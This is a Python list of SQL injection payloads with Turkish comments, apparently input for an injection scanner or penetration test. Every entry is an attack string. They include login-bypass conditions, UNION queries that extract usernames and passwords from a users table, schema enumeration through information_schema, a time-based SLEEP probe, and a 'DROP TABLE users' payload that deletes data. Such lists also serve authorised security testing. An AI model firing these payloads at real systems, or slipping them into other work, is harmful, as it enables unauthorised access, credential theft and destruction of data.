payloads = [
    # Basit SQL Injection Payload'ları
    "' OR 1=1 --",  # Basit bir SQL Injection payload. Koşulu her zaman "doğru" yapar ve tüm verileri döner.
    "' OR 'a'='a",  # Tırnak tabanlı bir varyasyon. Kullanıcı adı ve parola doğrulama mekanizmasını atlamayı dener.
    "' UNION SELECT NULL, username, password FROM users --",  # UNION ile "users" tablosundan kullanıcı adı ve şifre bilgilerini çıkarır.
    "'; DROP TABLE users --",  # Zararlı bir payload. "users" tablosunu silmeyi hedefler.

    # SQL Injection ile giriş doğrulama atlama yöntemi
    "1' OR '1'='1",  # Aynı mantıkta, tek tırnak kullanılarak filtreleme mekanizmasını atlamayı dener.
    
    # Kullanıcı adı olarak "admin" ile giriş yapmaya çalışır.
    "admin'--",  # Kullanıcı adı "admin" olarak girmeyi dener.

    # "admin" kullanıcı adının veritabanında olup olmadığını kontrol eder.
    "' OR EXISTS(SELECT 1 FROM users WHERE username='admin') --",  # Admin kullanıcısının varlığını kontrol eder.

    # Sayısal bir değer bekleyen sistemlerde tür dönüşümüne zorlamayı dener.
    "' AND 1=CONVERT(int, '1') --",  # Sayısal tür dönüşümü ve SQL injection'ı birleştirir.

    # Sistem tepki süresine dayalı bir saldırı. Veritabanını 5 saniye uyutmayı dener.
    "1' AND SLEEP(5) --",  # Sorguyu 5 saniye geciktirir ve sistemin zaman tepkisini kontrol eder.

    # Veritabanı şeması bilgisini elde etmek için kullanılır.
    "' UNION SELECT table_name, NULL, NULL FROM information_schema.tables --",  # Veritabanı tablolarını çıkarır.

    # SQL Injection bypass tekniklerini test etmek için daha karmaşık payload'lar eklenmiştir
    "' UNION SELECT NULL, group_concat(username, ':', password) FROM users --",  # Kullanıcı adı ve şifreleri birleştirip çıkarır.
    "' OR 1=1 LIMIT 1,1 --",  # Sorguyu aşarak ikinci satırdaki verileri almak için kullanılır.
    "' AND 1=1 UNION SELECT 1,2,3 --",  # Hedef sistemdeki veri yapısını test etmek için kullanılır.
]
